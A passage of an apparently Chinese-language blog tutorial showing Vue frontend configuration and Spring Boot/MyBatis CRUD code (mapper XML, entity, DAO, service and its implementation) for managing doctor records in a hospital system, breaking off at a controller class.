class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span><br><span class="hljs-comment">// 导入element css</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span><br><span class="hljs-comment">// 导入echarts</span><br><span class="hljs-comment">// import echarts from &#x27;echarts&#x27;</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> echarts <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;echarts&#x27;</span>;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">ElementUI</span>)<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(router)<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Axios</span>, axios)<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$echarts</span> = echarts<br><br><span class="hljs-comment">/* eslint-disable no-new */</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>  router,<br>  store,<br>  <span class="hljs-comment">// components: &#123;App&#125;,</span><br>  <span class="hljs-comment">// template: &#x27;&lt;App/&gt;&#x27;</span><br>  <span class="hljs-comment">// elementUI</span><br>  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><blockquote><p>注：引入前需要配套安装，安装方式基本都为：npm install xxx</p></blockquote></li></ul><p>还有一些要根据项目情况改变的小细节如下：</p><p>1、在写路径时可用@来代替src，相关配置在build&#x2F;webpack.base.conf.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">context</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;../&#x27;</span>),<br>  <span class="hljs-attr">entry</span>: &#123;<br>    <span class="hljs-attr">app</span>: <span class="hljs-string">&#x27;./src/main.js&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">extensions</span>: [<span class="hljs-string">&#x27;.js&#x27;</span>, <span class="hljs-string">&#x27;.vue&#x27;</span>, <span class="hljs-string">&#x27;.json&#x27;</span>],<br>    <span class="hljs-attr">alias</span>: &#123;<br>      <span class="hljs-string">&#x27;vue$&#x27;</span>: <span class="hljs-string">&#x27;vue/dist/vue.esm.js&#x27;</span>,<br>      <span class="hljs-string">&#x27;@&#x27;</span>: <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;src&#x27;</span>),<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、设置前后端交互的端口，相关配置在config&#x2F;index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">dev</span>: &#123;<br>    <span class="hljs-comment">// Paths</span><br>    <span class="hljs-attr">assetsSubDirectory</span>: <span class="hljs-string">&#x27;static&#x27;</span>,<br>    <span class="hljs-attr">assetsPublicPath</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">proxyTable</span>: &#123;<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        <span class="hljs-comment">// 此处写后端启动的端口号</span><br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:8081&#x27;</span>,<br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123;<br>          <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>        &#125;<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-comment">// can be overwritten by process.env.HOST</span><br>    <span class="hljs-comment">// 此处写前端启动的端口号</span><br>    <span class="hljs-attr">port</span>: <span class="hljs-number">8080</span>, <span class="hljs-comment">// can be overwritten by process.env.PORT, if port is in use, a free one will be determined</span><br>    <span class="hljs-attr">autoOpenBrowser</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">errorOverlay</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">notifyOnErrors</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">poll</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// https://webpack.js.org/configuration/dev-server/#devserver-watchoptions-</span><br><br>    <span class="hljs-attr">useEslint</span>: <span class="hljs-literal">true</span>,<br><br>    <span class="hljs-attr">showEslintErrorsInOverlay</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;cheap-module-eval-source-map&#x27;</span>,<br>    <span class="hljs-attr">cacheBusting</span>: <span class="hljs-literal">true</span>,<br><br>    <span class="hljs-attr">cssSourceMap</span>: <span class="hljs-literal">true</span><br>  &#125;,<br></code></pre></td></tr></table></figure><p>3、设置打开时的网页名称，在index.html中进行修改</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 此处写网页名称 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xbb-frontend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- built files will be auto injected --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="项目主要功能实现"><a href="#项目主要功能实现" class="headerlink" title="项目主要功能实现"></a>项目主要功能实现</h2><h3 id="1、基础增删改查及分类"><a href="#1、基础增删改查及分类" class="headerlink" title="1、基础增删改查及分类"></a>1、基础增删改查及分类</h3><p>以doctor为例</p><p>&#x3D;&#x3D;后端内容&#x3D;&#x3D;</p><p>在src&#x2F;main&#x2F;resources&#x2F;mybatis.mappers中新建DoctorMapper.xml，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.xbb.dao.DoctorMapper&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 增加 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;addDoctor&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.xbb.entity.Doctor&quot;</span>&gt;</span><br>        insert into doctor_info(id,name,sex,idCard,age,birth,image,introduction,department,sort,fee,telephone)<br>        values(#&#123;id&#125;,#&#123;name&#125;,#&#123;sex&#125;,#&#123;idCard&#125;,#&#123;age&#125;,#&#123;birth&#125;,#&#123;image&#125;,#&#123;introduction&#125;,#&#123;department&#125;,#&#123;sort&#125;,#&#123;fee&#125;,#&#123;telephone&#125;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 删除 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteDoctor&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.xbb.entity.Doctor&quot;</span>&gt;</span><br>        delete from doctor_info where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!-- 修改 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateDoctor&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.xbb.entity.Doctor&quot;</span>&gt;</span><br>        update doctor_info set name=#&#123;name&#125;,sex=#&#123;sex&#125;,idCard=#&#123;idCard&#125;,age=#&#123;age&#125;,birth=#&#123;birth&#125;,image=#&#123;image&#125;,introduction=#&#123;introduction&#125;,department=#&#123;department&#125;,sort=#&#123;sort&#125;,fee=#&#123;fee&#125;,telephone=#&#123;telephone&#125;<br>        where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 查询 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectAll&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;doctor&quot;</span>&gt;</span><br>        select * from doctor_info<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 根据科室查询医生 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByDepartment&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;doctor&quot;</span>&gt;</span><br>        select * from doctor_info where department = #&#123;department&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!-- 模糊查询 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;doctor&quot;</span>&gt;</span><br>    select * from doctor_info where name like concat(&#x27;%&#x27;,#&#123;val&#125;,&#x27;%&#x27;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>utils中新建Result工具类，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.utils;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Result</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> total;<span class="hljs-comment">//内容长度</span><br>    <span class="hljs-keyword">private</span> Object data;<span class="hljs-comment">// 内容</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>entity中新建Doctor实体类，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.entity;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Doctor</span> &#123;<br>    <span class="hljs-keyword">private</span> Long id;<span class="hljs-comment">//工号</span><br>    <span class="hljs-keyword">private</span> String name;<span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">private</span> String sex;<span class="hljs-comment">//性别</span><br>    <span class="hljs-keyword">private</span> String idCard;<span class="hljs-comment">//身份证号</span><br>    <span class="hljs-keyword">private</span> String telephone;<span class="hljs-comment">//电话号码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">private</span> String birth;<span class="hljs-comment">//出生日期</span><br>    <span class="hljs-keyword">private</span> String image;<span class="hljs-comment">//个人照片</span><br>    <span class="hljs-keyword">private</span> String introduction;<span class="hljs-comment">//个人简介</span><br>    <span class="hljs-keyword">private</span> String department;<span class="hljs-comment">//科室</span><br>    <span class="hljs-keyword">private</span> String sort;<span class="hljs-comment">//职称</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> fee;<span class="hljs-comment">//挂号费</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>dao中新建DcotorMapper.interface，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.dao;<br><span class="hljs-keyword">import</span> com.xbb.entity.Doctor;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DoctorMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addDoctor</span><span class="hljs-params">(Doctor doctor)</span>;<span class="hljs-comment">//添加医生信息（医生）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">deleteDoctor</span><span class="hljs-params">(Long id)</span>;<span class="hljs-comment">//删除一条医生信息记录（管理员）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateDoctor</span><span class="hljs-params">(Doctor doctor)</span>;<span class="hljs-comment">//修改医生信息（医生）</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectAll</span><span class="hljs-params">()</span>;<span class="hljs-comment">//查询所有医生信息（管理员）</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectByDepartment</span><span class="hljs-params">(String department)</span>;<span class="hljs-comment">//根据科室查询医生信息（病人）</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">search</span><span class="hljs-params">(String val)</span>;<span class="hljs-comment">//根据医生名模糊查询（管理员）</span><br>&#125;<br></code></pre></td></tr></table></figure><p>service中新建DoctorService.interface，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.service;<br><span class="hljs-keyword">import</span> com.xbb.entity.Doctor;<br><span class="hljs-keyword">import</span> com.xbb.utils.Result;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DoctorService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addDoctor</span><span class="hljs-params">(Doctor doctor)</span>;<span class="hljs-comment">//添加医生信息（医生）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">deleteDoctor</span><span class="hljs-params">(Long id)</span>;<span class="hljs-comment">//删除一条医生信息记录（管理员）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateDoctor</span><span class="hljs-params">(Doctor doctor)</span>;<span class="hljs-comment">//修改医生信息（医生）</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectAllOnce</span><span class="hljs-params">()</span>;<span class="hljs-comment">//一次获取所有医生信息（管理员）</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">selectAll</span><span class="hljs-params">(<span class="hljs-type">int</span> current,<span class="hljs-type">int</span> size)</span>;<span class="hljs-comment">//分页查询所有医生信息（管理员）</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectByDepartment</span><span class="hljs-params">(String department)</span>;<span class="hljs-comment">//根据科室查询医生信息（病人）</span><br>    Result <span class="hljs-title function_">search</span><span class="hljs-params">(Integer current, Integer size, String val)</span>;<span class="hljs-comment">//根据医生名模糊查询并分类</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Impl中新建DoctorServiceImpl接口实现类，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.service.impl;<br><br><span class="hljs-keyword">import</span> com.github.pagehelper.Page;<br><span class="hljs-keyword">import</span> com.github.pagehelper.PageHelper;<br><span class="hljs-keyword">import</span> com.xbb.dao.DoctorMapper;<br><span class="hljs-keyword">import</span> com.xbb.entity.Doctor;<br><span class="hljs-keyword">import</span> com.xbb.service.DoctorService;<br><span class="hljs-keyword">import</span> com.xbb.utils.Result;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoctorServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DoctorService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> DoctorMapper doctorMapper;<span class="hljs-comment">//这里总会报错，不知为何，但不影响运行</span><br><br>    <span class="hljs-comment">// 插入：添加医生</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addDoctor</span><span class="hljs-params">(Doctor doctor)</span> &#123;<br>        <span class="hljs-keyword">return</span> doctorMapper.addDoctor(doctor);<br>    &#125;<br><br>    <span class="hljs-comment">// 删除：删除医生</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">deleteDoctor</span><span class="hljs-params">(Long id)</span> &#123;<br>        <span class="hljs-keyword">return</span> doctorMapper.deleteDoctor(id);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 修改：修改医生信息</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateDoctor</span><span class="hljs-params">(Doctor doctor)</span> &#123;<br>        <span class="hljs-keyword">return</span> doctorMapper.updateDoctor(doctor);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 查询：一次获取所有医生列表</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectAllOnce</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> doctorMapper.selectAll();<br>    &#125;<br><br>    <span class="hljs-comment">// 查询：一次获取所有医生列表并分页</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">selectAll</span><span class="hljs-params">(<span class="hljs-type">int</span> current ,<span class="hljs-type">int</span> size)</span> &#123;<br>        Page&lt;Doctor&gt; doctors = PageHelper.startPage(current, size);<br>        doctorMapper.selectAll();<br>        <span class="hljs-type">Result</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>();<br>        result.setData(doctors.getResult());<br>        result.setTotal(doctors.getTotal());<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">// 查询：根据科室名查询医生</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectByDepartment</span><span class="hljs-params">(String department)</span> &#123;<br>        <span class="hljs-keyword">return</span> doctorMapper.selectByDepartment(department);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 模糊查询：根据医生名进行模糊查询并分类</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">search</span><span class="hljs-params">(Integer current, Integer size, String val)</span> &#123;<br>        Page&lt;Doctor&gt; doctors = PageHelper.startPage(current, size);<br>        doctorMapper.search(val);<br>        <span class="hljs-type">Result</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>();<br>        result.setData(doctors.getResult());<br>        result.setTotal(doctors.getTotal());<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在controller中新建DoctorController类，内容如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.controller;<br><br><span class="hljs-keyword">import</span> com.xbb.entity.Doctor;<br><span class="hljs-keyword">import</span> com.xbb.entity.User;<br><span class="hljs-keyword">import</span> com.xbb.service.impl.DoctorServiceImpl;<br><span class="hljs-keyword">import</span> com.xbb.service.impl.UserServiceImpl;<br><span class="hljs-keyword">import</span> com.xbb.utils.Result;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(value = &quot;/doctor&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoctorController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> DoctorServiceImpl doctorService;<br><br>    <span class="hljs-comment">// 添加医生</span><br>    <span 